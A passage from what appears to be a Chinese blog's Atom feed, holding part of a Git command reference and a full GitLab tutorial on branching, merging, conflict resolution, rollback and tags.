设置远程仓库地址(用于修改远程仓库地址) git remote rm &lt;repository&gt; # 删除远程仓库</code></pre><h5 id="创建远程仓库"><a href="#创建远程仓库" class="headerlink" title="创建远程仓库"></a>创建远程仓库</h5><pre><code>git clone --bare robbin_site robbin_site.git # 用带版本的项目创建纯版本仓库scp -r my_project.git git@ git.csdn.net:~ # 将纯仓库上传到服务器上mkdir robbin_site.git &amp;&amp; cd robbin_site.git &amp;&amp; git --bare init # 在服务器创建纯仓库git remote add origin git@ github.com:robbin/robbin_site.git # 设置远程仓库地址git push -u origin master # 客户端首次提交git push -u origin develop # 首次将本地develop分支提交到远程develop分支，并且trackgit remote set-head origin master # 设置远程仓库的HEAD指向master分支</code></pre><h5 id="也可以命令设置跟踪远程库和本地库"><a href="#也可以命令设置跟踪远程库和本地库" class="headerlink" title="也可以命令设置跟踪远程库和本地库"></a>也可以命令设置跟踪远程库和本地库</h5><pre><code>git branch --set-upstream master origin/mastergit branch --set-upstream develop origin/develop</code></pre><h2 id="部分命令详细介绍"><a href="#部分命令详细介绍" class="headerlink" title="部分命令详细介绍"></a>部分命令详细介绍</h2><pre><code>git init     在本地新建一个repo,进入一个项目目录,执行git init,会初始化一个repo,并在当前文件夹下创建一个.git文件夹.git clone     获取一个url对应的远程Git repo, 创建一个local copy.     一般的格式是git clone [url].     clone下来的repo会以url最后一个斜线后面的名称命名,创建一个文件夹,如果想要指定特定的名称,可以git clone [url] newname指定.git status     查询repo的状态.     git status -s: -s表示short, -s的输出标记会有两列,第一列是对staging区域而言,第二列是对working目录而言.git log     show commit history of a branch.     git log --oneline --number: 每条log只显示一行,显示number条.     git log --oneline --graph:可以图形化地表示出分支合并历史.     git log branchname可以显示特定分支的log.     git log --oneline branch1 ^branch2,可以查看在分支1,却不在分支2中的提交.^表示排除这个分支(Window下可能要给^branch2加上引号).     git log --decorate会显示出tag信息.     git log --author=[author name] 可以指定作者的提交历史.     git log --since --before --until --after 根据提交时间筛选log.     --no-merges可以将merge的commits排除在外.     git log --grep 根据commit信息过滤log: git log --grep=keywords     默认情况下, git log --grep --author是OR的关系,即满足一条即被返回,如果你想让它们是AND的关系,可以加上--all-match的option.     git log -S: filter by introduced diff.     比如: git log -SmethodName (注意S和后面的词之间没有等号分隔).     git log -p: show patch introduced at each commit.     每一个提交都是一个快照(snapshot),Git会把每次提交的diff计算出来,作为一个patch显示给你看.     另一种方法是git show [SHA].     git log --stat: show diffstat of changes introduced at each commit.     同样是用来看改动的相对信息的,--stat比-p的输出更简单一些.git add     在提交之前,Git有一个暂存区(staging area),可以放入新添加的文件或者加入新的改动. commit时提交的改动是上一次加入到staging area中的改动,而不是我们disk上的改动.     git add .     会递归地添加当前工作目录中的所有文件.git diff     不加参数的git diff:     show diff of unstaged changes.     此命令比较的是工作目录中当前文件和暂存区域快照之间的差异,也就是修改之后还没有暂存起来的变化内容.     若要看已经暂存起来的文件和上次提交时的快照之间的差异,可以用:     git diff --cached 命令.     show diff of staged changes.     (Git 1.6.1 及更高版本还允许使用 git diff --staged，效果是相同的).     git diff HEAD     show diff of all staged or unstated changes.     也即比较woking directory和上次提交之间所有的改动.     如果想看自从某个版本之后都改动了什么,可以用:     git diff [version tag]     跟log命令一样,diff也可以加上--stat参数来简化输出.     git diff [branchA] [branchB]可以用来比较两个分支.     它实际上会返回一个由A到B的patch,不是我们想要的结果.     一般我们想要的结果是两个分支分开以后各自的改动都是什么,是由命令:     git diff [branchA]…[branchB]给出的.     实际上它是:git diff $(git merge-base [branchA] [branchB]) [branchB]的结果.git commit     提交已经被add进来的改动.     git commit -m “the commit message“     git commit -a 会先把所有已经track的文件的改动add进来,然后提交(有点像svn的一次提交,不用先暂存). 对于没有track的文件,还是需要git add一下.     git commit --amend 增补提交. 会使用与当前提交节点相同的父节点进行一次新的提交,旧的提交将会被取消.git reset     undo changes and commits.     这里的HEAD关键字指的是当前分支最末梢最新的一个提交.也就是版本库中该分支上的最新版本.     git reset HEAD: unstage files from index and reset pointer to HEAD     这个命令用来把不小心add进去的文件从staged状态取出来,可以单独针对某一个文件操作: git reset HEAD - - filename, 这个- - 也可以不加.     git reset --soft     move HEAD to specific commit reference, index and staging are untouched.     git reset --hard     unstage files AND undo any changes in the working directory since last commit.     使用git reset —hard HEAD进行reset,即上次提交之后,所有staged的改动和工作目录的改动都会消失,还原到上次提交的状态.     这里的HEAD可以被写成任何一次提交的SHA-1.     不带soft和hard参数的git reset,实际上带的是默认参数mixed.     总结:     git reset --mixed id,是将git的HEAD变了(也就是提交记录变了),但文件并没有改变，(也就是working tree并没有改变). 取消了commit和add的内容.     git reset --soft id. 实际上，是git reset –mixed id 后,又做了一次git add.即取消了commit的内容.     git reset --hard id.是将git的HEAD变了,文件也变了.     按改动范围排序如下:     soft (commit) &lt; mixed (commit + add) &lt; hard (commit + add + local working)git revert     反转撤销提交.只要把出错的提交(commit)的名字(reference)作为参数传给命令就可以了.     git revert HEAD: 撤销最近的一个提交.     git revert会创建一个反向的新提交,可以通过参数-n来告诉Git先不要提交.git rm     git rm file: 从staging区移除文件,同时也移除出工作目录.     git rm --cached: 从staging区移除文件,但留在工作目录中.     git rm --cached从功能上等同于git reset HEAD,清除了缓存区,但不动工作目录树.git clean     git clean是从工作目录中移除没有track的文件.     通常的参数是git clean -df:     -d表示同时移除目录,-f表示force,因为在git的配置文件中, clean.requireForce=true,如果不加-f,clean将会拒绝执行.git mv     git rm - - cached orig; mv orig new; git add newgit stash     把当前的改动压入一个栈.     git stash将会把当前目录和index中的所有改动(但不包括未track的文件)压入一个栈,然后留给你一个clean的工作状态,即处于上一次最新提交处.     git stash list会显示这个栈的list.     git stash apply:取出stash中的上一个项目(stash@{0}),并且应用于当前的工作目录.     也可以指定别的项目,比如git stash apply stash@{1}.     如果你在应用stash中项目的同时想要删除它,可以用git stash pop     删除stash中的项目:     git stash drop: 删除上一个,也可指定参数删除指定的一个项目.     git stash clear: 删除所有项目.git branch     git branch可以用来列出分支,创建分支和删除分支.     git branch -v可以看见每一个分支的最后一次提交.     git branch: 列出本地所有分支,当前分支会被星号标示出.     git branch (branchname): 创建一个新的分支(当你用这种方式创建分支的时候,分支是基于你的上一次提交建立的).      git branch -d (branchname): 删除一个分支.     删除remote的分支:     git push (remote-name) :(branch-name): delete a remote branch.     这个是因为完整的命令形式是:     git push remote-name local-branch:remote-branch     而这里local-branch的部分为空,就意味着删除了remote-branchgit checkout　　git checkout (branchname) 切换到一个分支.     git checkout -b (branchname): 创建并切换到新的分支.     这个命令是将git branch newbranch和git checkout newbranch合在一起的结果.     checkout还有另一个作用:替换本地改动:     git checkout --&lt;filename&gt;     此命令会使用HEAD中的最新内容替换掉你的工作目录中的文件.已添加到暂存区的改动以及新文件都不会受到影响.     注意:git checkout filename会删除该文件中所有没有暂存和提交的改动,这个操作是不可逆的.git merge     把一个分支merge进当前的分支.     git merge [alias]/[branch]     把远程分支merge到当前分支.     如果出现冲突,需要手动修改,可以用git mergetool.     解决冲突的时候可以用到git diff,解决完之后用git add添加,即表示冲突已经被resolved.git tag     tag a point in history as import.     会在一个提交上建立永久性的书签,通常是发布一个release版本或者ship了什么东西之后加tag.     比如: git tag v1.0     git tag -a v1.0, -a参数会允许你添加一些信息,即make an annotated tag.     当你运行git tag -a命令的时候,Git会打开一个编辑器让你输入tag信息.     我们可以利用commit SHA来给一个过去的提交打tag:     git tag -a v0.9 XXXX     push的时候是不包含tag的,如果想包含,可以在push时加上--tags参数.     fetch的时候,branch HEAD可以reach的tags是自动被fetch下来的, tags that aren’t reachable from branch heads will be skipped.如果想确保所有的tags都被包含进来,需要加上--tags选项.git remote     list, add and delete remote repository aliases.     因为不需要每次都用完整的url,所以Git为每一个remote repo的url都建立一个别名,然后用git remote来管理这个list.     git remote: 列出remote aliases.     如果你clone一个project,Git会自动将原来的url添加进来,别名就叫做:origin.     git remote -v:可以看见每一个别名对应的实际url.     git remote add [alias] [url]: 添加一个新的remote repo.     git remote rm [alias]: 删除一个存在的remote alias.     git remote rename [old-alias] [new-alias]: 重命名.     git remote set-url [alias] [url]:更新url. 可以加上—push和fetch参数,为同一个别名set不同的存取地址.git fetch     download new branches and data from a remote repository.     可以git fetch [alias]取某一个远程repo,也可以git fetch --all取到全部repo     fetch将会取到所有你本地没有的数据,所有取下来的分支可以被叫做remote branches,它们和本地分支一样(可以看diff,log等,也可以merge到其他分支),但是Git不允许你checkout到它们. git pull     fetch from a remote repo and try to merge into the current branch.     pull == fetch + merge FETCH_HEAD     git pull会首先执行git fetch,然后执行git merge,把取来的分支的head merge到当前分支.这个merge操作会产生一个新的commit.         如果使用--rebase参数,它会执行git rebase来取代原来的git merge.git rebase     --rebase不会产生合并的提交,它会将本地的所有提交临时保存为补丁(patch),放在”.git/rebase”目录中,然后将当前分支更新到最新的分支尖端,最后把保存的补丁应用到分支上.     rebase的过程中,也许会出现冲突,Git会停止rebase并让你解决冲突,在解决完冲突之后,用git add去更新这些内容,然后无需执行commit,只需要:     git rebase --continue就会继续打余下的补丁.     git rebase --abort将会终止rebase,当前分支将会回到rebase之前的状态.git push     push your new branches and data to a remote repository.     git push [alias] [branch]     将会把当前分支merge到alias上的[branch]分支.如果分支已经存在,将会更新,如果不存在,将会添加这个分支.     如果有多个人向同一个remote repo push代码, Git会首先在你试图push的分支上运行git log,检查它的历史中是否能看到server上的branch现在的tip,如果本地历史中不能看到server的tip,说明本地的代码不是最新的,Git会拒绝你的push,让你先fetch,merge,之后再push,这样就保证了所有人的改动都会被考虑进来.git reflog     git reflog是对reflog进行管理的命令,reflog是git用来记录引用变化的一种机制,比如记录分支的变化或者是HEAD引用的变化.     当git reflog不指定引用的时候,默认列出HEAD的reflog.     HEAD@{0}代表HEAD当前的值,HEAD@{3}代表HEAD在3次变化之前的值.     git会将变化记录到HEAD对应的reflog文件中,其路径为.git/logs/HEAD, 分支的reflog文件都放在.git/logs/refs目录下的子目录中.特殊符号:     ^代表父提交,当一个提交有多个父提交时,可以通过在^后面跟上一个数字,表示第几个父提交: ^相当于^1.     ~&lt;n&gt;相当于连续的&lt;n&gt;个^.</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Git常用命令&lt;br&gt;团队协作git操作流程&lt;br&gt;git工作流&lt;br&gt;Git命令大全&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="手册" scheme="http://austfish.cn/tags/%E6%89%8B%E5%86%8C/"/>
    
      <category term="git" scheme="http://austfish.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Gitlab详细操作</title>
    <link href="http://austfish.cn/2019/09/19/Gitlab%E8%AF%A6%E7%BB%86%E6%93%8D%E4%BD%9C/"/>
    <id>http://austfish.cn/2019/09/19/Gitlab详细操作/</id>
    <published>2019-09-19T06:52:49.000Z</published>
    <updated>2022-02-18T03:34:20.381Z</updated>
    
    <content type="html"><![CDATA[<p>基本操作、远程仓库、进阶操作、分支管理、标签管理、协同开发实例、常见问题<br><a id="more"></a></p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><strong>git安装</strong><br>在Windows上使用Git，可以从Git官网直接下载安装程序，默认安装即可。安装完成之后会多处git bash和git GUI两个程序，我们使用git bash 采用命令行的方式进行一系列的操作。</p><p><strong>本地git仓库</strong><br><strong>1、什么是本地仓库</strong><br>版本库又名仓库，英文名repository，你可以简单理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”</p><p><strong>2、本地仓库的建立</strong><br>在本地选择一个目录，新建文件夹，并在终端打开这个文件夹。<br>将这个文件夹初始化为仓库，使用命令 git init 将这个文件夹初始化为git可以管理的仓库，那么现在我们的这个本地文件夹就变化了Git可以管理的仓库，在这个文件夹下会有一个隐藏的 .git 文件夹<br><strong>3、在本地的仓库添加或者修改文件</strong><br>在本地的仓库进行代码编写的时候，我们首先要明白git中工作区和暂存区的概念。</p><ul><li>工作区</li></ul><p>我们在资源管理器里可以看到的文件就是我们的工作区</p><ul><li>暂存区</li></ul><p>当我们的代码完成了一个阶段，我们想当前的这个版本在本地仓库进行保存一个版本，也就是commit操作，但是假如我们每次文件修改后都需要进行一次commit，会比较麻烦，所以Git给我们提供了一种方式，就是将修改的文件进行一次add操作，添加到暂存区中，在进行了一些add之后，统一进行commit操作。当然也可以直接每次add之后就进行commit。</p><pre><code>git add filename --将文件添加到暂存区git add . -- 将本地仓库所有的文件添加到暂存区git commit -m &quot;提交说明&quot; --使用commit将暂存区的文件进行提交到本地的分支，-m 代表本次的提交说明</code></pre><p><strong>4、使用git status查看工作区和暂存区的状态</strong><br>当我们在工作区进行了文件的修改和文件的增加的时候，git status会告诉我们发生了什么变化，来帮助我们进行判断。</p><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p><strong>1、github和gitlab的区别</strong><br>github和github都是基于git的web代码仓库管理软件。区别主要在于github上的仓库基本上都是开源的，当然也可以创建私有的代码仓库，但是费用比较昂贵。而gitlab是可以在企业内部搭建，可以创建私有的代码仓库，除此之外，gitlab还有一些其他的高级特性。相同之处是他们都是基于版本管理系统git，都使用git的命令进行操作。</p><p><strong>2、远程仓库和本地仓库的关联</strong><br>将本地的仓库仓库推送到远程是比较安全的，当本地代码出现问题的时候，我们可以很方便在的远程仓库上进行代码的拉取。具体操作如下：</p><p>1.如果我们按照上面的步骤已经在本地上建好了一个仓库，想和远程仓库进行关联，我们首先要在远程的仓库上新建一个项目，然后我们使用下面的代码进行关联（http方式）</p><pre><code>git remote add origin http://github.com/username/learngit.gitusername 是远程仓库的用户名，learngit是远程仓库的名称</code></pre><p>或者（ssh密钥方式）:</p><pre><code>git remote add origin git@github.com:michaelliao/learngit.git</code></pre><p>2.关联的时候有两种方式来验证用户的信息，一种是http方式，一种是ssh密钥方式，如果想要简化配置流程，使用http方式即可。</p><p>3.在经过了上述的关联之后，我们下一次进行推动的时候，只需要使用 git push origin master 即可完成推送。origin代表远程仓库，master是这个仓库的一个主分支也是默认分支。但是实际上我们是应该在其他分支上进行开发和推送，在下文会讲到。</p><p><strong>3、从远程库上进行克隆</strong><br>在远程仓库新建项目，使用git clone命令克隆到本地进行开发。这时候本地就会出现一个和项目名称相同的文件夹，在文件夹下同样.git文件夹来记录版本信息，这时候git已经在本地帮我们建立好了一个仓库。因为我们是直接在git上克隆下来的，所有已经和远程的仓库建立了关联，我们可以直接进行代码的推送</p><h2 id="进阶操作"><a href="#进阶操作" class="headerlink" title="进阶操作"></a>进阶操作</h2><p><strong>版本回退</strong><br>当我们在开发的时候，将文件进行添加到暂存区然后提交到本地的版本库。版本库会将我们每一次的操作来进行一次存档。那么久方便我们很容易回退到某个版本。<br>我们可以使用 <code>git diff HEAD -- filename</code> 命令可以查看工作区和版本库里面最新版本的区别，如果确定需要回退，那就按照下述的方式来进行回退。我们分几个情境来进行版本回退</p><p><strong>1、当前编辑的文件还没有提交到暂存区</strong><br>如果只是做了简单的修改，我们可以手动恢复到我们想要的状态，但是加入修改过多，已经忘记自己修改了什么内容，那么使用<br><code>git checkout -- file</code> 可以丢弃工作区的修改，在这里可能有两种情况：</p><p>一种是file自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；</p><p>一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。简单说就是让这个文件回到最近一次git commit或git add时的状态。</p><p><strong>2、文件已经提交到了暂存区但是并没有提交到本地的版本库</strong><br>git reset HEAD <file> 可以把暂存区的修改撤销掉（unstage），重新放回工作区。git reset命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用HEAD时，表示最新的版本。<br>使用checkout 就可以丢弃工作区的修改了。</file></p><p><strong>3、已经将文件存储到暂存区并提交到了本地版本库</strong><br>当我们进行回退的时候，要知道我们要回退到哪个版本，在git中使用HEAD表示当前的版本，那么如果要是回退到上个版本的话就是使用： git reset –hard HEAD^ 我们的版本就会被还原到上一个版本，使用HEAD^可以回退到上上一个版本，当然==再往上100个版本写100个比较容易数不过来，所以写成HEAD~100。</p><p>在使用git reset的时候，有两个参数可以选择，分别是git reset –hard/soft，hard和soft的主要区别在于，soft只是回退了commit的信息，也就是指向之前的commit信息，但是对应的文件并不会发生改变。而使用hard方式commit信息会指向之前的信息，同时在工作区的文件也会跟随者进行变化。</p><p><strong>4、当我们回退后又想前进到回退前的版本，git也提供了对应的操作方式</strong><br>我们可以使用 git reflog 命令查看操作记录，来判断我们要回到哪个版本。</p><h2 id="删除文件恢复"><a href="#删除文件恢复" class="headerlink" title="删除文件恢复"></a>删除文件恢复</h2><p>在git中，删除也是一个修改操作，一般会有以下两种操作。</p><p><strong>1、误删除文件（已经add或者已经commit）</strong><br>在本机上将文件进行删除后，我们介可以使用git status检测到文件的变动。但是原来的文件必须是已经add操作的<br>使用<code>git checkout -- 误删除文件名称</code>，和上文介绍的恢复工作区状态的指令相同。</p><p><strong>2、确定要删除文件</strong><br>当我们在资源管理器将某个文件删除，使用git status 会提示我们使用 git rm 进行删除文件<br>使用 <code>git rm （文件名称</code> 然后进行commit<br>当然也可以使用<code>git add .</code> 来添加全部修改或新增的文件<br>注意，当我们没有进行add 和commit操作的时候我们是无法从原来的版本库进行恢复的，也就是直接新建一个文件，没有经过任何操作，是无法恢复的。</p><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><p>分支管理的目的就是将当前已经可以发布模块放在一个分支，在另外一个分支进行进一步开发，开发完成后可以进行分支合并。<br>在gitlab上默认的分支是master（主分支），也只有这一个分支，其他分支需要开发人员自行建立。<br>主要操作如下</p><p><strong>指令    功能</strong></p><ul><li>git branch    查看分支（*指向的为当前的分支）</li><li>git branch<name>    创建分支</name></li><li>git checkout<name>    切换分支</name></li><li>git checkout -b <name>    创建加切换分支</name></li><li>git merge <name>    合并某分支到当前分支</name></li><li>git branch -d<name>    删除分支</name></li></ul><p><strong>1、创建与合并分支</strong></p><ul><li>创建分支</li></ul><p>在本地新建dev分支并指向dev分支后，这时候仓库下的文件更改都是在dev分支下的操作，当进行修改后，可以推送到远程的dev分支，如果远程没有dev分支，git会帮助我们新建dev分支并将文件推送。其他开发者在自己的本机建立dev分支，也向远程的dev分支进行推送（后面介绍本地dev分支和远程dev分支相连以及冲突的解决）。</p><ul><li>合并分支</li></ul><p>切换到master分支之后，将dev分支合并到当前的master分支，合并完成后，git会提示我们当前分支比远程的分支超前一个。<br><a href="https://imgchr.com/i/nqjg8x" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25xamc4eC5wbmc?x-oss-process=image/format,png" alt="nqjg8x.png"></a></p><p><strong>合并图解</strong>如下：<br>新建dev分支，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上：<br><a href="https://imgchr.com/i/nqvKiR" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25xdktpUi5wbmc?x-oss-process=image/format,png" alt="nqvKiR.png"></a><br>新提交一次后，dev指针往前移动一步，而master指针不变：</p><p><a href="https://imgchr.com/i/nqvGLD" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25xdkdMRC5wbmc?x-oss-process=image/format,png" alt="nqvGLD.png"></a><br>合并dev分支，git的方式是将master指向dev分支</p><p><a href="https://imgchr.com/i/nqvBSP" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25xdkJTUC5wbmc?x-oss-process=image/format,png" alt="nqvBSP.png"></a><br><strong>在远程仓库进行合并的方式</strong></p><p>在实际的开发中，一般master主分支是受保护的，也就是说只有项目的负责人才有权限在master分支上进行相关的操作，其他普通开发者只能向dev分支进行推送，那么普通开发者怎么才能让负责人知道自己可以合并分支，这就需要在gitlab的dev分支界面发起合并请求，负责人收到请求后开始合并。</p><p><strong>2、分支冲突的解决</strong><br><strong>本地冲突</strong></p><p>当我们在本地使用master分支合并dev分支的时候出现冲突，如下图</p><p><a href="https://imgchr.com/i/nqv7mF" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25xdjdtRi5wbmc?x-oss-process=image/format,png" alt="nqv7mF.png"></a><br>使用git status 也可以查看冲突</p><p><a href="https://imgchr.com/i/nqxC0e" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25xeEMwZS5wbmc?x-oss-process=image/format,png" alt="nqxC0e.png"></a><br>使用cat命令查看冲突，Git用&lt;&lt;&lt;&lt;&lt;&lt;&lt;，=======，&gt;&gt;&gt;&gt;&gt;&gt;&gt;标记出不同分支的内容</p><p><a href="https://imgchr.com/i/nqxs91" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25xeHM5MS5wbmc?x-oss-process=image/format,png" alt="nqxs91.png"></a><br>其中HEAD代表当前的代码，&gt;&gt;&gt;&gt;代表其他版本冲突的代码，我们打开冲突的文件，将代码冲突进行修改之后，将HEAD，&gt;&gt;&gt;等标志删除之后重新进行提交即可。</p><p><a href="https://imgchr.com/i/nqxhAH" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25xeGhBSC5wbmc?x-oss-process=image/format,png" alt="nqxhAH.png"></a><br>提交完成后重新进行合并</p><p><a href="https://imgchr.com/i/nqx54A" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25xeDU0QS5wbmc?x-oss-process=image/format,png" alt="nqx54A.png"></a><br><strong>远程推送出现冲突</strong></p><p>当我们的本地的分支推送到远程的分支的时候，可能远程上的分支已经进行了修改，那么我们将会push失败，解决方案是：<br>1.从远程的分支上拉最新的分支 git pull<br>2.在拉取完成后，会自动提示我们冲突的文件，我们按照相同的方式进行修改后重新提交推送即可。</p><p><strong>3、分支合并的模式</strong><br>有两种常用的合并分支的方式</p><p>1、快速合并方式</p><p>如果待合并的分支在当前分支的下游，也就是说没有分叉时，会发生快速合并，git会提示我们此次合并是快速合并。</p><p><a href="https://imgchr.com/i/nL3X4J" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25MM1g0Si5wbmc?x-oss-process=image/format,png" alt="nL3X4J.png"></a><br>这种方法相当于直接把master分支移动到test分支所在的地方，并移动HEAD指针。</p><p>2、普通合并方式</p><p>如果我们不想要快速合并，那么我们可以强制指定为非快速合并，只需加上–no-ff参数，普通合并实质上是在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。所以需要我们添加commit描述</p><p><a href="https://imgchr.com/i/nL8A4H" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25MOEE0SC5wbmc?x-oss-process=image/format,png" alt="nL8A4H.png"></a><br>3、两种合并方式对比</p><p>下图中第二、三次提交是快速合并，都是基于dev分支提交，但在查看log信息的时候，看不出来是合并操作，紧接着我们在dev分支继续修改，然后使用普通合并模式进行修改，这次可以发现分支图上显示我们的操作流程，在dev分支进行修改，在master分支进行合并。推荐在合并的时候使用普通合并。</p><p><a href="https://imgchr.com/i/nL8egI" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzA5LzE5L25MOGVnSS5wbmc?x-oss-process=image/format,png" alt="nL8egI.png"></a><br><strong>4、分支管理策略</strong><br>实际开发时，应该按照以下几个原则进行开发</p><p>1、master分支应该是非常稳定的，也就是仅用来发布新版本，平时不在上面干活</p><p>2、干活都在dev分支，也就是说Dev分支是不稳定的，到某个时候，比如发布版本的时候，将dev分支合并到master上，在master分支发布版本</p><p>3、开发者可以在dev分支上开发，每个人都有自己的分支，最后往dev分支合并就可以了</p><p>4、合并分支的时候，加上–no-ff参数就可以用普通模式合并，合并后的历史有分支，可以看出曾经做过合并，而fast forward则看不出来</p><h2 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h2><p>发布一个版本时，我们通常先在版本库中打一个标签（tag），这样，就唯一确定了打标签时刻的版本。将来无论什么时候，取某个标签的版本，就是把那个打标签的时刻的历史版本取出来。所以，标签也是版本库的一个快照。我们在发布一个版本的时候，会对应有一个commit， 但是这个commit可能是比较难记的，所以我们选择一个好记忆的方式tag，例如v1.0 与某个commit绑定。</p><p>在Git中打标签非常简单，首先，切换到需要打标签的分支上：<br>然后，敲命令git tag 就可以打一个新标签：</p><pre><code>git tag v1.0</code></pre><p>可以用命令git tag查看所有标签：</p><pre><code>$ git tagv1.0</code></pre><p>默认标签是打在最新提交的commit上的。有时候，如果忘了打标签，比如，现在已经是周五了，但应该在周一打的标签没有打，怎么办？方法是找到历史提交的commit id，然后打上就可以了：</p><pre><code>git tag v0.9 f52c633</code></pre><p>协同开发实例<br>项目负责人在远程仓库新建了仓库，克隆到本地，新建dev分支并推送到远程，那么远程仓库也就有了dev分支。</p><p>在克隆结束仓库之后，最好在本地这个仓库使用本地 set 的方法设置 gitlab 用户名和email(如果本机没有GitHub的环境可以忽略)</p><pre><code>git config —local user.name ‘XXX’ git config —local user.email ‘xxx@dist.com.cn</code></pre><p>设置完之后可以使用<code>git config --list</code> 查看</p><p>设置完成之后将本地文件推到远程dev</p><p>其他开发人员从远程仓库克隆仓库到本地，在本地新建dev分支并直接切换到dev分支，然后将服务器上的dev版本使用<code>git pull</code> 命令拉下来，这样本地就具有了一个dev的开发环境，之后就在dev上进行开发和push（同样进行一下local的配置）</p><p>本地dev开发完成之后，push到远程dev，如果和远程有冲突，会出现下图的情况</p><p>这时候我们需要将远程的dev分支上的文件拉下来，git会提示我们什么地方出了问题，<strong>git pull相当于自动的 fetch 和 merge 操作，会试图自动将远程库合并入本地库，在有冲突时再要求手动合并，git fetch 只是将远程的文件拉下来，不会与本地的分支进行合并，而pull的操作时将远程的代码拉取下来并与本地的分支进行合并。</strong></p><p>git提示我们 这是dev分支.txt 有冲突，那么我们就针对这个文件进行修改，其中HEAD代表当前的代码，&gt;&gt;&gt;&gt;代表其他版本冲突的代码，我们打开冲突的文件，将代码冲突进行修改之后，将HEAD，&gt;&gt;&gt;等标志删除之后重新进行提交即可。</p><p>修改完冲突之后进行add和commit，最后push到云端没有问题</p><h2 id="常见问题的解决"><a href="#常见问题的解决" class="headerlink" title="常见问题的解决"></a>常见问题的解决</h2><ul><li>git推送到远程错误的文件怎么处理</li></ul><p>先回退到前一个版本：</p><pre><code>git reset --hard HEAD^</code></pre><p>然后强制推送当前这个版本到云端</p><pre><code>git push origin HEAD --force</code></pre><ul><li>从远程pull数据时候存在冲突怎么解决？</li></ul><p>出现这种问题的原因是远程上已经存在的代码和我们本地的代码，因为代码冲突并不止是存在于向远程推送时会发生。解决方式时根据提示，找到错误的文件，进行修改即可。要注意pull的意义就是为了在本地进行代码合并，来避免推送到远程的时候出现代码冲突。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;基本操作、远程仓库、进阶操作、分支管理、标签管理、协同开发实例、常见问题&lt;br&gt;
    
    </summary>
    
    
      <category term="工具" scheme="http://austfish.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
      <category term="手册" scheme="http://austfish.cn/tags/%E6%89%8B%E5%86%8C/"/>
    
      <category term="git" scheme="http://austfish.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Python项目管理工具：虚拟环境venv使用方法</title>
    <link href="http://austfish.cn/2019/09/19/Python%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%9A%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83venv%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://austfish.cn/2019/09/19/Python项目管理工具：虚拟环境venv使用方法/</id>
    <published>2019-09-19T06:39:48.000Z</published>
    <updated>2022-02-18T03:34:21.147Z</updated>
    
